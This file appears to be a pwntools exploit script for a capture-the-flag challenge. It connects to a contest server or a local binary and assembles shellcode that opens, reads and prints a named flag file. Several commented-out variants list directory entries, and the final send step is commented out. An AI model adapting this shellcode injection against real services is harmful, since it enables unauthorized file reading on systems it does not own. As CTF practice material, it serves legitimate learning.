#!/usr/bin/python3

from pwn import *

exe = ELF('./chall', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+193

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('ctf.tcp1p.com', 8008)
else:
        p = process(exe.path)
GDB()

if args.REMOTE:
        payload = asm('''
              push rdx
              mov rsi, rsp
              ''')
else:
        payload = asm('''
              push r8
              mov rsi, rsp
              ''')

payload += asm('mov r15 , [rsi]')
# payload+= asm(shellcraft.read('rax', 'r15', 0x100))

# payload += asm(shellcraft.write(1, 'rsi', 0x10))
# payload += asm("mov rsi, r8")
# payload += asm(shellcraft.open("."))
# payload += asm("mov rsi, r8")
# payload += asm("add rsi, 0x100")
# payload += asm(shellcraft.syscall("SYS_getdents64", "rax","rsi", 0x100))
# payload += asm(shellcraft.write(1, "rsi", 0x100))

payload = asm(shellcraft.open('./flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt'))
payload+= asm(shellcraft.read('rax', 'r15', 0x100))
payload+= asm(shellcraft.write(1, 'r15', 0x100))

# sa(b'me? \n', payload)
# flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt
# flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt
p.interactive()
